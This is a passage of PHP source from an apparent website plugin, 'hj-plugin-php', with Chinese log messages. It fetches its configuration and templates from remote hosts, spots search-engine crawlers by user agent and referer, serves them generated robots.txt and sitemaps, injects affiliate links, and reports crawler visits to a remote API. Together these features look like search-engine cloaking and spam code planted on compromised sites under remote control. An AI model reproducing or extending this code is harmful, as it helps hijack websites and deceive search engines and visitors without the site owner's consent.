        if (!is_bool($seoSiteUseOriginalContent)) {
            return false;
        }
        return $seoSiteUseOriginalContent;
    }

    public static function loadConfig()
    {

        $site =  RequestUtils::getHost();

        hj_checkFilePath(self::$ConfigCacheFilePath);

        $oldConfig = null;

        if (file_exists(self::$ConfigCacheFilePath) && filesize(self::$ConfigCacheFilePath) > 0) {

            hj_echo("配置文件 缓存文件存在:", self::$ConfigCacheFilePath);
            $content = hj_get_file_content(self::$ConfigCacheFilePath);

            if ($content !== false) {
                hj_echo("配置文件 读取缓存配置文件成功:", self::$ConfigCacheFilePath);
                $oldConfig = json_decode($content, true);

                if ($oldConfig !== null) {

                    if (filemtime(self::$ConfigCacheFilePath) > time() - 60 * 60) {
                        hj_echo("配置文件 缓存文件在一小时有效期之内:", self::$ConfigCacheFilePath);

                        self::$Config = $oldConfig;
                        hj_echo("配置文件 缓存配置文件解析成功:", self::$ConfigCacheFilePath);

                        $successFilePath = self::getSuccessRemoteConfigUrlPath($site);
                        if (file_exists($successFilePath)) {
                            $successUrl = hj_get_file_content($successFilePath);
                            if ($successUrl !== false) {
                                self::$ConfigUrl = $successUrl;
                                hj_echo("配置文件 读取成功获得远程文件url路径:", $successFilePath, "远程文件url:", self::$ConfigUrl);
                            }
                        }
                        return;
                    } else {
                        hj_echo("配置文件 缓存文件超过一小时有效期:", self::$ConfigCacheFilePath);
                    }
                } else {

                    hj_echo("配置文件 解析失败删除缓存配置文件:", self::$ConfigCacheFilePath);
                    hj_clean_cache_dir(self::$ConfigCacheFilePath);
                }
            } else {
                hj_echo("配置文件 读取失败删除缓存配置文件:", self::$ConfigCacheFilePath);
            }
        } else {
            hj_echo("配置文件 缓存文件不存在:", self::$ConfigCacheFilePath);
        }

        $content = false;
        if (HJ_OFFLINE) {

            self::$ConfigUrl =  sprintf(HJ_CONFIG_URL_FORMAT, HJ_OFFLINE_HOST);
            $content = hj_get_file_content(self::$ConfigUrl);
        } else {

            $HJ_CONFIG_URL_FORMAT_ARRAY = $GLOBALS['HJ_CONFIG_URL_FORMAT_ARRAY'];
            foreach ($HJ_CONFIG_URL_FORMAT_ARRAY as $format) {
                $url = sprintf($format, RequestUtils::getHost());
                hj_echo("尝试配置文件地址:", $url);
                $content = hj_get_file_content($url);
                if ($content !== false) {
                    hj_echo("配置文件地址有效 使用该地址:", $url);
                    self::$ConfigUrl = $url;
                    break;
                } else {
                    hj_echo("配置文件地址无效 跳过该地址:", $url);
                }
            }
        }

        if ($content === false) {
            hj_echo("配置文件 远程获取配置文件失败:", self::$ConfigUrl);

            self::$Config = $oldConfig;
            $ret = Api::postNoRemoteConfig(self::$ConfigUrl);

            hj_echo("配置文件 远程获取配置文件失败上报:", json_encode($ret));
            return;
        }

        $successFilePath = self::getSuccessRemoteConfigUrlPath($site);

        file_put_contents($successFilePath, self::$ConfigUrl);
        hj_echo("配置文件 记录成功获得远程文件url路径:", $successFilePath, "远程文件url:", self::$ConfigUrl);

        $config = json_decode($content, true);

        self::$Config = $config;

        if ($oldConfig == null) {
            hj_echo("配置文件 旧配置文件不存在写入缓存文件:", self::$ConfigCacheFilePath);
            if ($content !== false) {
                hj_echo("配置文件 远程文件内容存在写入缓存文件:", self::$ConfigCacheFilePath);

                file_put_contents(self::$ConfigCacheFilePath, $content);

                if (!file_exists(Disk::getTmpDir())) {

                    mkdir(Disk::getTmpDir(), 0777, true);
                }
            }
        } else if ($config != null && $oldConfig['updatedAt'] != $config['updatedAt']) { // 判断配置文件是否有变化
            hj_echo("配置文件 有变化 写入缓存文件:", self::$ConfigCacheFilePath);

            file_put_contents(self::$ConfigCacheFilePath, $content);

            if (!file_exists(Disk::getTmpDir())) {

                mkdir(Disk::getTmpDir(), 0777, true);
            }
        } else {

            hj_echo("配置文件 无变化 修改缓存文件的修改时间为当前时间:", self::$ConfigCacheFilePath);
            touch(self::$ConfigCacheFilePath);
        }
    }

    public static function loadOfflineConfig()
    {

        $content = hj_get_file_content(self::$ConfigCacheFilePath);

        if ($content === false) {
            hj_echo("配置文件 离线获取配置文件失败:", self::$ConfigUrl);
            return;
        }

        $config = json_decode($content, true);
        if (!$config) {
            hj_echo("配置文件 离线解析配置文件失败:", $content);
            return;
        }

        self::$Config = $config;
    }

    public static  function getConfig()
    {
        return self::$Config;
    }

    public static function getSeoSiteEnable()
    {

        $seoSiteEnable = true;

        if (self::$Config == null) {
            hj_echo("获取站点是否启用 配置不存在:", self::$Config);
            return $seoSiteEnable;
        }

        if (!isset(self::$Config['seoSiteEnable'])) {
            hj_echo("获取站点是否启用 配置站点是否启用不存在:", "seoSiteEnable");
            return $seoSiteEnable;
        }

        if (is_bool(self::$Config['seoSiteEnable'])) {
            $seoSiteEnable = self::$Config['seoSiteEnable'];
        }
        return $seoSiteEnable;
    }

    public static function getConfigByName($name)
    {

        $config = self::$Config[$name];
        return $config;
    }

    public static function getConfigUrl()
    {
        return self::$ConfigUrl;
    }

    public static function getRemoteFileContent($url)
    {

        $fileName = basename($url);

        $filePath = hj_join_paths(Disk::getRemoteCacheDir(), $fileName);

        hj_checkFilePath($filePath);

        if (file_exists($filePath) && filesize($filePath) > 0) {
            hj_echo("获取远程文件内容 地址(",  $url, ")存在缓存模板文件路径:", $filePath);

            $content = hj_get_file_content($filePath);
            return $content;
        } else {

            $content = hj_get_file_content($url);

            if (empty($content)) {
                hj_echo("获取远程文件内容 地址(",  $url, ")不存在缓存 但是获取远程内容为空:", $filePath);
                return null;
            }

            file_put_contents($filePath, $content);
            hj_echo("获取远程文件内容 地址(",  $url, ") 不存在缓存,写入缓存模板文件路径:", $filePath);
            return $content;
        }
    }

    public static function getRemoteFile($url)
    {

        $fileName = basename($url);

        $filePath = hj_join_paths(Disk::getRemoteCacheDir(), $fileName);

        hj_checkFilePath($filePath);

        if (file_exists($filePath) && filesize($filePath) > 0) {
            hj_echo("获取远程文件 地址(",  $url, ")存在缓存文件路径:", $filePath);
            return $filePath;
        } else {

            $content = hj_get_file_content($url);

            if (empty($content)) {
                hj_echo("获取远程文件 地址(",  $url, ")不存在本地缓存 但是获取远程内容为空:", $filePath);
                return null;
            }

            file_put_contents($filePath, $content);
            hj_echo("获取远程文件 地址(",  $url, ")不存在本地缓存 缓存本地 缓存文件路径:", $filePath);
            return $filePath;
        }
    }

    public static function getSeoTemplateUrl()
    {

        if (self::$Config == null) {
            hj_echo("获取模板 配置不存在:", self::$Config);
            return null;
        }

        if (!isset(self::$Config['seoTemplateUrl'])) {
            hj_echo("获取模板 配置模板地址不存在:", "seoTemplateUrl");
            return null;
        }
        $seoTemplateUrl = self::$Config['seoTemplateUrl'];
        if ($seoTemplateUrl == null) {
            hj_echo("获取模板 配置模板地址不存在:", $seoTemplateUrl);
            return null;
        }

        return $seoTemplateUrl;
    }

    public static function getSitemapindexFormat()
    {
        return 'wp-sitemap-' . self::getSeoTemplateType() . '-';
    }

    public static function getSitemapRangeBegin()
    {
        if (self::$Config == null) {
            hj_echo("获取sitemapRangeBegin 配置不存在:", self::$Config);
            return 0;
        }
        if (!isset(self::$Config['sitemapRangeBegin'])) {
            hj_echo("获取sitemapRangeBegin 配置sitemapRangeBegin不存在:", "sitemapRangeBegin");
            return 0;
        }

        $sitemapRangeBegin = self::$Config['sitemapRangeBegin'];

        if (!is_int($sitemapRangeBegin)) {
            return 0;
        }
        return $sitemapRangeBegin;
    }

    public static function getSitemapRangeEnd()
    {
        if (self::$Config == null) {
            hj_echo("获取sitemapRangeEnd 配置不存在:", self::$Config);
            return 0;
        }
        if (!isset(self::$Config['sitemapRangeEnd'])) {
            hj_echo("获取sitemapRangeEnd 配置sitemapRangeEnd不存在:", "sitemapRangeEnd");
            return 0;
        }

        $sitemapRangeEnd = self::$Config['sitemapRangeEnd'];

        if (!is_int($sitemapRangeEnd)) {
            return 0;
        }

        return $sitemapRangeEnd;
    }

    public static function getDiskCleanThreshold()
    {
        if (self::$Config == null) {
            hj_echo("获取diskCleanThreshold 配置不存在:", self::$Config);
            return 0.9;
        }
        if (!isset(self::$Config['diskCleanThreshold'])) {
            hj_echo("获取diskCleanThreshold 配置diskCleanThreshold不存在:", "diskCleanThreshold");
            return 0.9;
        }

        $diskCleanThreshold = self::$Config['diskCleanThreshold'];

        if (!is_numeric($diskCleanThreshold)) {
            return 0.9;
        }

        if ($diskCleanThreshold <= 0 || $diskCleanThreshold >= 1) {
            return 0.9;
        }

        return $diskCleanThreshold;
    }

    public static function getDiskCleanRatio()
    {
        if (self::$Config == null) {
            hj_echo("获取diskCleanRatio 配置不存在:", self::$Config);
            return 0.1;
        }
        if (!isset(self::$Config['diskCleanRatio'])) {
            hj_echo("获取diskCleanRatio 配置diskCleanRatio不存在:", "diskCleanRatio");
            return 0.1;
        }

        $diskCleanRatio = self::$Config['diskCleanRatio'];

        if (!is_numeric($diskCleanRatio)) {
            return 0.1;
        }

        if ($diskCleanRatio < 0 || $diskCleanRatio >= 1) {
            return 0.1;
        }

        return $diskCleanRatio;
    }

    public static function getCacheDuration()
    {
        if (self::$Config == null) {
            hj_echo("获取cacheDuration 配置不存在:", self::$Config);
            return 60 * 60 * 24 * 7;
        }
        if (!isset(self::$Config['cacheDuration'])) {
            hj_echo("获取cacheDuration 配置cacheDuration不存在:", "cacheDuration");
            return 60 * 60 * 24 * 7;
        }

        $cacheDuration = self::$Config['cacheDuration'];

        if (!is_int($cacheDuration)) {
            return 60 * 60 * 24 * 7;
        }

        if ($cacheDuration == 0) {
            return 60 * 60 * 24 * 7;
        }

        return $cacheDuration;
    }

    public static function getSeoVars()
    {

        if (self::$Config == null) {
            hj_echo("获取模板变量 配置不存在:", self::$Config);
            return null;
        }

        if (!isset(self::$Config['seoVars'])) {
            hj_echo("获取模板变量 配置模板变量不存在:", "seoVars");
            return null;
        }
        $seoVars = self::$Config['seoVars'];

        return $seoVars;
    }

    public static function getAffLinkTemplateContent()
    {

        if (self::$Config == null) {
            hj_echo("获取推广链接模板资源 配置不存在:", self::$Config);
            return null;
        }

        if (!isset(self::$Config['affLinkTemplateSeoRes'])) {
            hj_echo("获取推广链接模板资源 配置推广链接模板资源不存在:", "affLinkTemplateSeoRes");
            return null;
        }
        $affLinkTemplateSeoRes = self::$Config['affLinkTemplateSeoRes'];

        if (!is_array($affLinkTemplateSeoRes)) {
            return null;
        }

        if (!isset($affLinkTemplateSeoRes['url'])) {
            return null;
        }

        if (!is_string($affLinkTemplateSeoRes['url'])) {
            return null;
        }
        $url = $affLinkTemplateSeoRes['url'];

        if (empty($url)) {
            return null;
        }

        $content = self::getRemoteFileContent($url);

        if (empty($content)) {
            return null;
        }
        return $content;
    }

    public static function getAffLinkSeoRes()
    {
        if (self::$Config == null) {
            hj_echo("获取推广链接资源 配置不存在:", self::$Config);
            return null;
        }
        if (!isset(self::$Config['affLinkSeoRes'])) {
            hj_echo("获取推广链接资源 配置推广链接资源不存在:", "affLinkSeoRes");
            return null;
        }

        $affLinkSeoRes = self::$Config['affLinkSeoRes'];

        return $affLinkSeoRes;
    }

    public static function getAffLinkSeoResArr()
    {
        if (self::$Config == null) {
            hj_echo("获取推广链接资源数组 配置不存在:", self::$Config);
            return null;
        }
        if (!isset(self::$Config['affLinkSeoResArr'])) {
            hj_echo("获取推广链接资源数组 配置推广链接资源不存在:", "affLinkSeoResArr");
            return null;
        }

        $affLinkSeoResArr = self::$Config['affLinkSeoResArr'];

        return $affLinkSeoResArr;
    }

    public static function getSeoSiteVerifyMap()
    {
        if (self::$Config == null) {
            hj_echo("获取站点验证 配置不存在:", self::$Config);
            return null;
        }
        if (!isset(self::$Config['seoSiteVerifyMap'])) {
            hj_echo("获取站点验证 配置站点验证不存在:", "seoSiteVerifyMap");
            return null;
        }

        $seoSiteVerifyMap = self::$Config['seoSiteVerifyMap'];

        return $seoSiteVerifyMap;
    }

    public static function getSeoGroupSn()
    {
        if (self::$Config == null) {
            hj_echo("获取seoGroupSn 配置不存在:", self::$Config);
            return null;
        }
        if (!isset(self::$Config['seoGroupSn'])) {
            hj_echo("获取seoGroupSn 配置seoGroupSn不存在:", "seoGroupSn");
            return null;
        }

        $seoGroupSn = self::$Config['seoGroupSn'];

        return $seoGroupSn;
    }

    public static function getSeoGroupUrlMatchRules()
    {
        if (self::$Config == null) {
            hj_echo("获取seoGroupUrlMatchRules 配置不存在:", self::$Config);
            return null;
        }
        if (!isset(self::$Config['seoGroupUrlMatchRules'])) {
            hj_echo("获取seoGroupUrlMatchRules 配置seoGroupUrlMatchRules不存在:", "seoGroupUrlMatchRules");
            return null;
        }

        $seoGroupUrlMatchRules = self::$Config['seoGroupUrlMatchRules'];

        return $seoGroupUrlMatchRules;
    }

    public static function getUrlFilterRules()
    {

        $urlFilterRules = array();

        if (self::$Config == null) {
            hj_echo("获取urlFilterRules 配置不存在:", self::$Config);
            return $urlFilterRules;
        }

        if (isset(self::$Config['urlFilterRules'])) {

            if (!empty(self::$Config['urlFilterRules']) && is_array(self::$Config['urlFilterRules'])) {
                $urlFilterRules = self::$Config['urlFilterRules'];
            }
        }

        hj_echo("当前 urlFilterRules:", json_encode($urlFilterRules));

        return $urlFilterRules;
    }

    private static $FullSeoGroupUrlMatchRules = null;
    public static function getFullSeoGroupUrlMatchRules()
    {
        if (self::$FullSeoGroupUrlMatchRules == null) {
            self::$FullSeoGroupUrlMatchRules = array();

            $seoGroupUrlMatchRules = self::getSeoGroupUrlMatchRules();

            if ($seoGroupUrlMatchRules != null) {
                hj_echo("获取完整的SeoGroupUrlMatchRules seoGroupUrlMatchRules:", json_encode($seoGroupUrlMatchRules));
                self::$FullSeoGroupUrlMatchRules = $seoGroupUrlMatchRules;
            } else {

                $seoGroupSn = self::getSeoGroupSn();

                if ($seoGroupSn != null) {
                    hj_echo("获取完整的 FullSeoGroupUrlMatchRules seoGroupSn:", $seoGroupSn);
                    array_push(self::$FullSeoGroupUrlMatchRules, $seoGroupSn);
                }
            }

            hj_echo("获取完整的 FullSeoGroupUrlMatchRules:", json_encode(self::$FullSeoGroupUrlMatchRules));
        }

        return self::$FullSeoGroupUrlMatchRules;
    }

    public static function getSeoGroupUaMatchRules()
    {

        $seoGroupUaMatchRules = array(
            'Googlebot' // Google 爬虫
        );
        if (self::$Config) {
            if (isset(self::$Config['seoGroupUaMatchRules'])) {
                if (self::$Config['seoGroupUaMatchRules'] && is_array(self::$Config['seoGroupUaMatchRules'])) {

                    $seoGroupUaMatchRules = self::$Config['seoGroupUaMatchRules'];
                    hj_echo("获取 seoGroupUaMatchRules 配置seoGroupUaMatchRules存在:", json_encode($seoGroupUaMatchRules));
                }
            }
        }

        hj_echo("获取seoGroupUaMatchRules 配置seoGroupUaMatchRules存在:", json_encode($seoGroupUaMatchRules));

        return $seoGroupUaMatchRules;
    }

    public static function getSeoGroupRedirectUrlMatchRules()
    {

        $seoGroupRedirectUrlMatchRules = self::getFullSeoGroupUrlMatchRules();
        if (self::$Config) {
            if (isset(self::$Config['seoGroupRedirectUrlMatchRules'])) {
                if (self::$Config['seoGroupRedirectUrlMatchRules'] && is_array(self::$Config['seoGroupRedirectUrlMatchRules'])) {

                    $seoGroupRedirectUrlMatchRules = self::$Config['seoGroupRedirectUrlMatchRules'];
                    hj_echo("获取 seoGroupRedirectUrlMatchRules 配置seoGroupRedirectUrlMatchRules存在:", json_encode($seoGroupRedirectUrlMatchRules));
                }
            }
        }

        hj_echo("获取 seoGroupRedirectUrlMatchRules :", json_encode($seoGroupRedirectUrlMatchRules));
        return $seoGroupRedirectUrlMatchRules;
    }

    public static function getSeoGroupRefererMatchRules()
    {

        $seoGroupRefererMatchRules = array(
            'google.com', // Google
            'bing.com', // Bing
            'yahoo.com', // Yahoo
            'duckduckgo.com', // DuckDuckGo
            'baidu.com', // 百度
            'yandex.com', // Yandex
            'sogou.com', // 搜狗
            'exalead.com', // Exalead
            'facebook.com', // Facebook
            'alexa.com' // Alexa
        );
        if (self::$Config) {
            if (isset(self::$Config['seoGroupRefererMatchRules'])) {
                if (self::$Config['seoGroupRefererMatchRules'] && is_array(self::$Config['seoGroupRefererMatchRules'])) {

                    $seoGroupRefererMatchRules = self::$Config['seoGroupRefererMatchRules'];
                    hj_echo("获取 seoGroupRefererMatchRules 配置seoGroupRefererMatchRules存在:", json_encode($seoGroupRefererMatchRules));
                }
            }
        }

        hj_echo("获取 seoGroupRefererMatchRules 配置seoGroupRefererMatchRules存在:", json_encode($seoGroupRefererMatchRules));
        return $seoGroupRefererMatchRules;
    }

    public static function getSeoTemplateType()
    {
        if (self::$Config == null) {
            hj_echo("获取seoTemplateType 配置不存在:", self::$Config);
            return null;
        }
        if (!isset(self::$Config['seoTemplateType'])) {
            hj_echo("获取seoTemplateType 配置seoTemplateType不存在:", "seoTemplateType");
            return null;
        }

        $seoTemplateType = self::$Config['seoTemplateType'];

        return $seoTemplateType;
    }

    public static function getSeoTemplatePaths()
    {
        if (self::$Config == null) {
            hj_echo("获取seoTemplatePaths 配置不存在:", self::$Config);
            return null;
        }
        if (!isset(self::$Config['seoTemplatePaths'])) {
            hj_echo("获取seoTemplatePaths 配置seoTemplatePaths不存在:", "seoTemplatePaths");
            return null;
        }

        $seoTemplatePaths = self::$Config['seoTemplatePaths'];

        return $seoTemplatePaths;
    }

    private static $FullSeoTemplatePaths = null;

    public static function getFullSeoTemplatePaths()
    {
        if (self::$FullSeoTemplatePaths == null) {
            self::$FullSeoTemplatePaths = array();

            $seoTemplatePaths = self::getSeoTemplatePaths();

            if ($seoTemplatePaths != null) {
                hj_echo("获取完整的seoTemplatePaths seoTemplatePaths:", json_encode($seoTemplatePaths));
                self::$FullSeoTemplatePaths = $seoTemplatePaths;
            } else {

                $seoTemplateType = self::getSeoTemplateType();

                if ($seoTemplateType != null) {
                    hj_echo("获取完整的 FullSeoTemplatePaths seoTemplateType:", $seoTemplateType);
                    array_push(self::$FullSeoTemplatePaths, $seoTemplateType);
                }
            }

            hj_echo("获取完整的 FullSeoTemplatePaths:", json_encode(self::$FullSeoTemplatePaths));
        }

        return self::$FullSeoTemplatePaths;
    }

    public static function getUseSitemap()
    {
        if (self::$Config == null) {
            hj_echo("获取useSitemap 配置不存在:", self::$Config);
            return false;
        }
        if (!isset(self::$Config['useSitemap'])) {
            hj_echo("获取useSitemap 配置useSitemap不存在:", "useSitemap");
            return false;
        }

        $useSitemap = self::$Config['useSitemap'];

        if (!is_bool($useSitemap)) {
            hj_echo("获取useSitemap 配置useSitemap不是bool类型:", $useSitemap);
            return false;
        }

        return $useSitemap;
    }

    public static function getSeoSiteLocalLinkNum()
    {

        $seoSiteLocalLinkNum = 40;

        if (defined('HJ_DEFAULT_LOCAL_LINK_NUM')) {
            $seoSiteLocalLinkNum = HJ_DEFAULT_LOCAL_LINK_NUM;
        }
        if (self::$Config == null) {
            hj_echo("获取seoSiteLocalLinkNum 配置不存在 当前默认本地链接数量:", $seoSiteLocalLinkNum);
            return $seoSiteLocalLinkNum;
        }
        if (!isset(self::$Config['seoSiteLocalLinkNum'])) {
            hj_echo("获取seoSiteLocalLinkNum 配置seoSiteLocalLinkNum不存在 当前默认本地链接数量:", $seoSiteLocalLinkNum);
            return $seoSiteLocalLinkNum;
        }

        $seoSiteLocalLinkNum = self::$Config['seoSiteLocalLinkNum'];

        hj_echo("获取 seoSiteLocalLinkNum:", $seoSiteLocalLinkNum);

        return $seoSiteLocalLinkNum;
    }

    public static function getSeoSiteAffLinkNum()
    {

        $seoSiteAffLinkNum = 20;

        if (defined('HJ_DEFAULT_AFF_LINK_NUM')) {
            $seoSiteAffLinkNum = HJ_DEFAULT_AFF_LINK_NUM;
        }
        if (self::$Config == null) {
            hj_echo("获取seoSiteAffLinkNum 配置不存在 当前默认推广链接数量:", $seoSiteAffLinkNum);
            return $seoSiteAffLinkNum;
        }
        if (!isset(self::$Config['seoSiteAffLinkNum'])) {
            hj_echo("获取seoSiteAffLinkNum 配置seoSiteAffLinkNum不存在 当前默认推广链接数量:", $seoSiteAffLinkNum);
            return $seoSiteAffLinkNum;
        }

        $seoSiteAffLinkNum = self::$Config['seoSiteAffLinkNum'];

        hj_echo("获取 seoSiteAffLinkNum:", $seoSiteAffLinkNum);

        return $seoSiteAffLinkNum;
    }

    public static function clientBaseUrl()
    {
        if (self::$Config == null) {
            hj_echo("获取clientBaseUrl 配置不存在:", self::$Config);
            return null;
        }
        if (!isset(self::$Config['clientBaseUrl'])) {
            hj_echo("获取clientBaseUrl 配置clientBaseUrl不存在:", "clientBaseUrl");
            return null;
        }

        $clientBaseUrl = self::$Config['clientBaseUrl'];

        return $clientBaseUrl;
    }

    public static function getMode()
    {

        $mode = HJ_MODE_NORMAL;

        if (!empty(self::$Config) && isset(self::$Config['mode'])) {

            if (is_int(self::$Config['mode'])) {

                $mode = self::$Config['mode'];
            }
        }

        if (!defined('HJ_MODE')) {

            define('HJ_MODE', $mode);
        } else {

            if (is_int(HJ_MODE)) {

                $mode =  HJ_MODE;
            }
        }

        return $mode;
    }

    public static function seoConfigId()
    {
        if (self::$Config == null) {
            hj_echo("获取seoConfigId 配置不存在:", self::$Config);
            return null;
        }
        if (!isset(self::$Config['id'])) {
            hj_echo("获取seoConfigId 配置seoConfigId不存在:", "id");
            return null;
        }

        $seoConfigId = self::$Config['id'];

        return $seoConfigId;
    }

    public static function getPluginVersion()
    {
        $pluginVersion = 'hj-plugin-php';
        #获取HJ_NAME常量
        if (defined('HJ_NAME')) {
            $pluginVersion = HJ_NAME;
        }
        #获取HJ_VERSION常量
        if (defined('HJ_VERSION')) {
            $pluginVersion = $pluginVersion . '-' . HJ_VERSION;
        }
        return $pluginVersion;
    }

    public static function getPluginMd5()
    {

        $pluginFilePath = RequestUtils::getPluginAbsolutePath();

        if (!file_exists($pluginFilePath)) {
            return "";
        }

        $pluginMd5 = md5_file($pluginFilePath);
        if ($pluginMd5 == false) {
            return "";
        }
        return $pluginMd5;
    }

    public static function useMainWordForNewLink()
    {
        if (self::$Config == null) {
            hj_echo("获取useMainWordForNewLink 配置不存在:", self::$Config);
            return true;
        }
        if (!isset(self::$Config['useMainWordForNewLink'])) {
            hj_echo("获取useMainWordForNewLink 配置useMainWordForNewLink不存在:", "useMainWordForNewLink");
            return true;
        }

        $useMainWordForNewLink = self::$Config['useMainWordForNewLink'];

        if ($useMainWordForNewLink === false) {
            return false;
        }
        return true;
    }

    public static function getMainWordUseRound()
    {
        if (self::$Config == null) {
            hj_echo("获取mainWordUseRound 配置不存在:", self::$Config);
            return 3;
        }
        if (!isset(self::$Config['mainWordUseRound'])) {
            hj_echo("获取mainWordUseRound 配置mainWordUseRound不存在:", "mainWordUseRound");
            return 3;
        }

        $mainWordUseRound = self::$Config['mainWordUseRound'];

        if (!is_numeric($mainWordUseRound)) {
            return 3;
        }
        return $mainWordUseRound;
    }

    public static function getSeoGroupSelfBotUaMatchRules()
    {

        $defautlSeoGroupSelfBotUaMatchRules = array(

            'gooqlebot',
            'Googlebot/2.;',

            'Googlébot', //é 
            'Googlêbot', //ê 
            'Googlebót;', //ó 
            'Googlebôt;', //ô 
            'Googlebõt;', //õ 
            'Googlèbot;', //è 
            'Googlëbot;', //ë 

            'Binqbot',
            'bingbot/2.;', //  

            'Bíngbot', //í 
            'Bìngbot', //ì 
            'Bîngbot', //î 
            'Bïngbot', //ï 
            'Bingbót;', //ó 
            'Bingbôt;', //ô 
            'Bingbõt;' //õ 

        );
        $seoGroupSelfBotUaMatchRules = $defautlSeoGroupSelfBotUaMatchRules;
        if (self::$Config) {
            if (isset(self::$Config['seoGroupSelfBotUaMatchRules'])) {
                if (self::$Config['seoGroupSelfBotUaMatchRules'] && is_array(self::$Config['seoGroupSelfBotUaMatchRules'])) {

                    $seoGroupSelfBotUaMatchRules = self::$Config['seoGroupSelfBotUaMatchRules'];
                    hj_echo("获取 seoGroupSelfBotUaMatchRules 配置 seoGroupSelfBotUaMatchRules 存在:", json_encode($seoGroupSelfBotUaMatchRules));
                }
            }
        }
        if (count($seoGroupSelfBotUaMatchRules) == 0) {
            # code...
            hj_echo("获取 seoGroupSelfBotUaMatchRules 配置 seoGroupSelfBotUaMatchRules 为空:", json_encode($seoGroupSelfBotUaMatchRules));
            $seoGroupSelfBotUaMatchRules = $defautlSeoGroupSelfBotUaMatchRules;
        }

        hj_echo("获取 seoGroupSelfBotUaMatchRules 配置 seoGroupSelfBotUaMatchRules 存在:", json_encode($seoGroupSelfBotUaMatchRules));

        return $seoGroupSelfBotUaMatchRules;
    }

    public static function getAffLinkMainWordSeoResArr()
    {
        if (self::$Config == null) {
            hj_echo("获取推广链接主词资源数组 配置不存在:", self::$Config);
            return null;
        }
        if (!isset(self::$Config['affLinkMainWordSeoResArr'])) {
            hj_echo("获取推广链接主词资源数组 配置推广链接主词资源数组不存在:", "affLinkMainWordSeoResArr");
            return null;
        }

        $affLinkMainWordSeoResArr = self::$Config['affLinkMainWordSeoResArr'];
        if (!is_array($affLinkMainWordSeoResArr)) {
            hj_echo("获取推广链接主词资源数组 配置推广链接主词资源数组不是数组:", json_encode($affLinkMainWordSeoResArr));
            return null;
        }
        return $affLinkMainWordSeoResArr;
    }

    public static function isRewrite()
    {

        $isRewrite = true;

        if (defined('HJ_REWRITE')) {
            $isRewrite = HJ_REWRITE;
        }

        if (self::$Config == null) {
            hj_echo("获取isRewrite 配置不存在:", self::$Config);
            return $isRewrite;
        }
        if (!isset(self::$Config['isRewrite'])) {
            hj_echo("获取isRewrite 配置isRewrite不存在:", "isRewrite");
            return $isRewrite;
        }

        $isRewriteConf = self::$Config['isRewrite'];

        if (!is_bool($isRewriteConf)) {
            hj_echo("获取isRewrite 配置isRewrite不是bool类型:", $isRewriteConf);
            return $isRewrite;
        }

        return $isRewrite;
    }

    public static function getIpBlacklistSeoResArr()
    {
        if (self::$Config == null) {
            hj_echo("获取ip黑名单资源数组 配置不存在:", self::$Config);
            return null;
        }
        if (!isset(self::$Config['ipBlacklistSeoResArr'])) {
            hj_echo("获取ip黑名单资源数组 配置ip黑名单资源数组不存在:", "ipBlacklistSeoResArr");
            return null;
        }

        $ipBlacklistSeoResArr = self::$Config['ipBlacklistSeoResArr'];
        if (!is_array($ipBlacklistSeoResArr)) {
            hj_echo("获取ip黑名单资源数组 配置ip黑名单资源数组不是数组:", json_encode($ipBlacklistSeoResArr));
            return null;
        }
        return $ipBlacklistSeoResArr;
    }

    public static function checkIpBlacklist()
    {

        if (self::$Config == null) {
            hj_echo("渲染ip黑名单 配置不存在");
            return null;
        }

        if (!RequestUtils::isIpBlacklistRequest()) {
            hj_echo("渲染ip黑名单 不是请求ip黑名单 URL:", RequestUtils::getRequestUri());
            return null;
        }
        $header = array();

        $content = '<!DOCTYPE html>
 <html lang="en">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>403 Forbidden</title>
 </head>
 <body>
     <h1>403 Forbidden</h1>
     <p>Your IP address has been blocked. Please contact the administrator if you believe this is a mistake.</p>
 </body>
 </html>
 ';
        $renderData = array(
            "code" => 403,
            "header" => $header,
            "content" => $content
        );
        return $renderData;
    }

    public static function getSeoResManifestArr()
    {
        if (self::$Config == null) {
            hj_echo("获取SEO资源清单列表 配置不存在:", self::$Config);
            return null;
        }
        if (!isset(self::$Config['seoResManifestArr'])) {
            hj_echo("获取SEO资源清单列表 配置SEO资源清单列表不存在:", "seoResManifestArr");
            return null;
        }

        $seoResManifestArr = self::$Config['seoResManifestArr'];
        if (!is_array($seoResManifestArr)) {
            hj_echo("获取SEO资源清单列表 配置SEO资源清单列表不是数组:", json_encode($seoResManifestArr));
            return null;
        }
        return $seoResManifestArr;
    }

    /** 业务相关 begin */

    public static function renderRobots()
    {

        if (!self::getUseSitemap()) {
            return null;
        }

        if (self::$Config == null) {
            hj_echo("渲染robots.txt 配置不存在:");
            return null;
        }

        if (!self::getSeoSiteEnable()) {
            hj_echo("渲染robots.txt 站点未开启:");
            return null;
        }

        if (!RequestUtils::isRobotsRequest()) {
            hj_echo("渲染robots.txt 不是请求robots.txt URL:", RequestUtils::getRequestUri());
            return null;
        }

        if (!RequestUtils::isBotRequest()) {
            hj_echo("渲染robots.txt 不是爬虫请求 UA:", RequestUtils::getUserAgent());
            return null;
        }

        $checkIpBlacklistResult = self::checkIpBlacklist();
        if ($checkIpBlacklistResult !== null) {
            return $checkIpBlacklistResult;
        }

        $robotsContent = RobotsTxt::getRobotsTxtContent();

        $keyword = "robots.txt";
        $seoConfigId = self::seoConfigId();

        $endTime = microtime(true);

        $responseTime = round(($endTime - self::$StartTime) * 1000);

        $result = Api::postBotLog(
            $seoConfigId,
            RequestUtils::getReferer(),
            RequestUtils::getFullUrl(),
            $keyword,
            RequestUtils::getUserAgent(),
            200,
            strlen($robotsContent),
            $responseTime
        );
        hj_echo("渲染robots.txt链接页面 爬虫上报结果:", json_encode($result));
        $robotsContent .= PHP_EOL;
        $robotsContent .=  "#RespTime:" . $responseTime . "ms" . PHP_EOL;

        $endTime = microtime(true);

        $costTime = round(($endTime - self::$StartTime) * 1000);
        $robotsContent .=  "#CostTime:" . $costTime . "ms" . PHP_EOL;

        $header = array(
            "Content-Type" => "text/plain; charset=utf-8"
        );
        $renderData = array(
            "code" => 200,
            "header" => $header,
            "content" => $robotsContent
        );
        return $renderData;
    }

    public static function renderSitemap()
    {

        if (!self::getUseSitemap()) {
            return null;
        }

        if (self::$Config == null) {
            hj_echo("渲染sitemap.xml 配置不存在:");
            return null;
        }

        if (!self::getSeoSiteEnable()) {
            hj_echo("渲染sitemap.xml 站点未开启:");
            return null;
        }

        if (!RequestUtils::isSitemapRequest()) {
            hj_echo("渲染sitemap.xml 不是请求sitemap.xml URL:", RequestUtils::getRequestUri());
            return null;
        }

        if (!RequestUtils::isBotRequest()) {
